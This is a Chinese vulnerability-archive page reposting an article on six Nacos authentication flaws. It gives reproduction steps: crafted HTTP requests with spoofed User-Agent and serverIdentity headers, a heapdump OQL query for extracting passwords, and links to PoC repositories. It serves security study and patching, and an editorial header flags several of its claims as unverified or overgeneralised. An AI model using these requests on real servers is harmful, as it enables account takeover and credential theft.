---
source: "MrWQ/vulnerability-paper"
title: "那些年我们一起追过的 Nacos"
product: "Nacos Server、Spring Boot Actuator"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "各auth开关/默认key/Actuator端点暴露条件独立，重置密码需查实际请求权限"
source_url: "https://mp.weixin.qq.com/s/OWUNgUpz1YHSum78mmHtRA"
source_status: "recorded"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-8fda98a031b73b4296d72df0"
entity_id: "ve-8fda98a031b73b4296d72df0"
schema_version: "1"
---

# 那些年我们一起追过的 Nacos

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：各auth开关/默认key/Actuator端点暴露条件独立，重置密码需查实际请求权限
- 证据范围：六节多为截图，B段仅替换403响应不证明JWT后端成功；D/E是否独立漏洞缺根因

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Nacos原生外部Redis存储说法需证实，Raft不是数据库类型
- SpringBoot并不自动泄露全部Actuator端点，Nacos*范围错误泛化
- 查heapdump password条目不保证是可用Nacos明文密码；仅用户名不能登录
- 修复建议只改token key无法修serverIdentity共享值，需要分别配置
- TrafficReviseFilter不是完整AuthFilter证明；密码重置是有状态影响

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OWUNgUpz1YHSum78mmHtRA)

**基本介绍**  

Nacos 是一个用于动态服务发现、配置管理和服务治理的开源平台，由阿里巴巴公司贡献。Nacos 提供了基于 DNS 和 HTTP 的服务发现能力，支持多种注册中心和数据存储方式，包括自身内置的 Raft 协议和外部的 MySQL、Redis 等数据存储

**功能模块**

Nacos 主要包括以下几个模块：

*   注册中心：负责服务注册和发现，提供高可用、可扩展、动态化的服务注册与发现能力。  
    
*   配置中心：提供统一的配置管理平台，可以动态地对服务进行配置管理和发布，支持灰度发布和版本管理等功能。  
    
*   服务管理：提供服务健康状态检查、流量管理等功能，支持服务降级、容错处理等机制，保证了系统的高可用性和稳定性。
    
*   命名空间：提供了多租户的支持，可以在同一个集群中为不同的应用程序创建不同的命名空间来隔离彼此。  
    
*   权限管理：提供了基于角色的权限管理机制，可以实现精细化的权限控制，保证了服务的安全性和可控性。  
    

Nacos 可以广泛应用于微服务架构、云原生应用、DevOps 等场景，为企业级应用提供了一套完整的服务发现和治理方案。  

**追逐旅程  
**

**A、Alibaba Nacos 任意用户创建**

#### 影响范围

Nacos <= 2.0.0-ALPHA.1

#### 漏洞类型

权限认证绕过

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1

![](../../.resource/remote/318859010050dfa818037824d26c2f6779084e20b2fd54d993c3027780e54f46.png)

之后执行以下命令启动环境：

```
./startup.sh -m standalone

```

![](../../.resource/remote/0f9c2a6919d3963242359178b6f2ea9d02ea0b72b15c1c8ccc4c72d2283b8a26.png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](../../.resource/remote/c5e7bbf2aab3a9091f1dd38bf3b419f2960be4f38eee38edf61f70f3ef1e41ae.png)

#### 漏洞复现

Step 1: 查看用户列表

```
http://192.168.174.236:8848/nacos/v1/auth/users?pageNo=1&pageSize=1

```

![](../../.resource/remote/e13d570c78b2f5f669bed54d912e7449ba1526c668b1b284d002cd3556986bc9.png)

Step 2：添加用户 Al1ex

```
http://your-ip:8848/nacos/v1/auth/users
POST:
Nacos-Server
.......
username=Al1ex&password=Al1ex

```

![](../../.resource/remote/de66a4d1a9fb4803fddbbc79f5d8420716d5d25a2964eabf9bafe9060d566e0b.png)

Step 3: 登录测试

![](../../.resource/remote/e38536ed9b0b296de010ec499531c4c3c7a165d4394fe52d324482567cd8e743.png)

成功登录：

![](../../.resource/remote/10ed79e06569f50e13808de5e16a3111a8c004b7ccd36713c3952877f655baa8.png)

#### 漏洞分析

Nacos-Server 是用来进行服务间的通信的白名单，比如服务 A 要访问服务 B，如何知道服务 A 是服务，只需要在服务 A 访问服务 B 的时候 UA 上写成 Nacos-Server 即可，所以当我们 UA 恶意改为 Nacos-Server 的时候，就会被误以为是服务间的通信，因此在白名单当中从而绕过认证，下面我们来看一下关键的处理逻辑位置 TrafficReviseFilter.java 中的 doFilter 的设计，在这里可以看到当接收到其他节点服务的请求时应该被 pass：

![](../../.resource/remote/d131cfb2fcd3c5406704451e99fae1d978478d5b5f86dff7abed7a5ea4262512.png)

关键的判断逻辑如下：

```
        if (StringUtils.startsWith(agent, Constants.NACOS_SERVER_HEADER)) {
            filterChain.doFilter(req, resp);
            return;
        }

```

之后对 Constants.NACOS_SERVER_HEADER 进行跟踪，之后确定为 Nacos-Server：

![](../../.resource/remote/a8b89e12859c5bc1ebb753e4a2a7b20f0af93414fe17fd957e23943bbccee256.png)

#### 参考链接

https://github.com/alibaba/nacos/issues/4593

**B、Alibab Nacos 未授权登录后台**  

#### 影响范围

Nacos <= 2.1.0 version

#### 漏洞说明

Nacos 使用了默认的 JWT key 导致的未授权访问漏洞，通过该漏洞攻击者可以绕过用户名和密码验证直接登录到 nacos 用户后台

#### 漏洞复现

Step 1：直接访问 Nacos 网站，填写任意用户名密码并使用 Burpsuite 抓包

![](../../.resource/remote/b257d005262889bb0e0c681b175a623a371cd2eb6d3e5636804146be2399ac66.png)

Step 2：之后拦截回显数据包，回显数据包如下

![](../../.resource/remote/9d4650bbb8f4a9f79975444bd1b60689dcdd3fee77dc208a863c31a8eac2d3dc.png)

Step 3：修改回显数据包状态 403 为 200 并修改回显数据信息

![](../../.resource/remote/fe77a96a8a24c8970061f077f7e86cdb1ec8d4b766d80ef84abd74cf0672f543.png)

Step 4：释放数据包后成功登录

![](../../.resource/remote/f86dce75d7d46eb3245d44ed5e6db96d14591d66ede54734918cd1d830083f2d.png)

**漏洞 POC**

https://github.com/Al1ex/Alibab-Nacos-Unauthorized-Login

![](../../.resource/remote/a8918dba0292615e0a235d3bab934a0383cf589216332603d555d23cef18329e.png)

**C、Alibab Nacos 账号密码获取**

#### 影响范围

Alibab Nacos *

#### 漏洞概述

SpringBoot 框架下拥有一个 Actuator 用来提供对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等，在 Actuator 启用的情况下如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点 (endpoints) 来获取应用系统中的监控信息，其中 Spring Boot 1.x 版本默认在 Url 根目录下，Spring Boot 2.x 版本端点移动到 / actuator / 路径

Alibab Nacos 如果是在 sping boot 框架下搭建，那么将会继承 spring boot 本身带有的信息泄露漏洞，攻击者可以通过此漏洞获取 Alibab Nacos 账号密码

#### 漏洞复现

Step 1：Nacos 继承自 Spring Boot 的目录如下：

```
/nacos/actuator
/nacos/actuator/auditevents
/nacos/actuator/beans
/nacos/actuator/caches
/nacos/actuator/conditions
/nacos/actuator/configprops
/nacos/actuator/env
/nacos/actuator/health
/nacos/actuator/info
/nacos/actuator/httptrace
/nacos/actuator/mappings  
/nacos/actuator/metrics
/nacos/actuator/scheduledtasks
/nacos/actuator/loggers
/nacos/actuator/threaddump  
/nacos/actuator/prometheus
/nacos/actuator/heapdump

```

Step 2：访问 / env 接口确定漏洞是否存在

![](../../.resource/remote/0580e2522c185b83e4da26f402d0d600cb8e517acc03648a778bbe7d47ffd50a.png)

Step 3：调用 / heapdump 接口下载 heapdump 文件

![](../../.resource/remote/c457566c7a5187ba286d3ae0d8e681688928bbf6a6d7f446b6aa660b6072d82d.png)

Step 4：使用 MemoryAnalyzer(https://www.eclipse.org/mat/downloads.php) 内存查看工具分析 headdump

![](../../.resource/remote/42d7ee1b59d6e8d9a7e87d5959badccdff558d12e3a2631c4fae8ff79ce87058.png)

Step 5：执行以下 OQL 语句获得密码

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))

```

![](../../.resource/remote/f8185a89837c2b997f4ccba061531e958369655e5be337f7d17c9ac875a69825.png)

Step 6：如果可以获取到用户名那边就可以直接登录

http://x.x.x.x/nacos/v1/auth/users?pageNo=1&pageSize=1

![](../../.resource/remote/45d9f397491cf8a1fdf62345c847133b8db12aed1c7f365bd45448376f4055f8.png)

**D、Alibaba Nacos 注册用户枚举**

#### 影响范围

Nacos < 2.2.0 

#### 漏洞类型

权限认证绕过

#### 利用条件

影响范围应用

#### 漏洞概述

Alibaba Nacos 注册用户枚举

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos/releases

![](../../.resource/remote/74243c9d48d2cc18007bf78fd0a3827475de537f94f197f4dff54ef00885b69e.png)

之后执行以下命令启动环境：

```
./startup.sh -m standalone

```

![](../../.resource/remote/14c183b3895bc7efee25cf86ee448d56bc845c48a9ae3d06d42d86fef9ecb1b9.png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](../../.resource/remote/23bc5384896f2cf54b1702b6af5b565ec81ad3d486333c3059bb59c17b229259.png)

#### 漏洞复现

查看用户列表

```
http://192.168.174.236:8848/nacos/v1/auth/users?pageNo=1&pageSize=9

```

![](../../.resource/remote/907847c6397f7fd1fd4d8baf1c76f4ee2bcf7e6c32981c30b9385e97877b7a2b.png)

#### 安全建议

升级到 2.2.0 版本之后

![](../../.resource/remote/e3c1238d67a57f7dd9d661a686bbd7eae165fafcaba9d7b014bba9cf8b2d20ef.png)

**E、Alibaba Nacos 任意用户密码重置**

#### 影响范围

Nacos <= 2.2.0

#### 漏洞类型

任意用户密码重置

#### 漏洞概述

Alibaba Nacos 任意用户密码重置

#### 环境搭建

下载安装文件：

https://github.com/alibaba/nacos

![](../../.resource/remote/b6e5ce56c5a4def69acf9713bc6649a2e878c2658e7364cddd85948a15c27f38.png)

之后执行以下命令启动环境：

![](../../.resource/remote/40da9abc03174e507172d0ead869db39189312726afb0900ceb3c2b622cf04f2.png)

之后访问 http://your-ip:8848/nacos，默认账号密码为：nacos/nacos

![](../../.resource/remote/f460442f85c1770410e6911c2fe0706d14c4ee668791b2811332881d75c0a831.png)

#### 漏洞复现

Step 1：获取用户名

![](../../.resource/remote/19e21ea9439c5c2eb619a08b0cadb43e4bb4818376147a200b5427b0862b7705.png)

Step 2：发送一下请求数据包重置密码

POC：https://github.com/Al1ex/Alibab-Nacos-Unauthorized-Reset-PWD

![](../../.resource/remote/64ac3daa90d9406523b0f9f2e90f381c4e8de0c09772766d3d6299fb13b341a2.png)

Step 3：登录

![](../../.resource/remote/df7fbccf2ad1eda1cb86e5e6e16329b655f24b93303579e3de6b8ed4518a9f35.png)

**F、Alibaba Nacos ServerIdentity 权限绕过**

#### 影响范围

Nacos <= 2.2.0

#### 漏洞概述

Nacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略。Nacos 平台在 Header 中添加 serverIdentity: security 能直接绕过身份验证查看用户列表

#### 漏洞复现

使用 POC 和 serverIdentity: security 查看当前用户名和密码

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken= HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
serverIdentity: security

```

![](../../.resource/remote/01fd2987d8f6d563d9db940d3d867f90915fe0d7f69d980aefa5793f23b1738c.png)

#### 安全建议

1、应用切换内网

2、更新到最新版本：https://github.com/alibaba/nacos/releases/tag/2.2.0.1

3、更改 application.properties 文件中 token.secret.key 默认值具体更改方法可参考：https://nacos.io/zh-cn/docs/v2/guide/user/auth.html

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
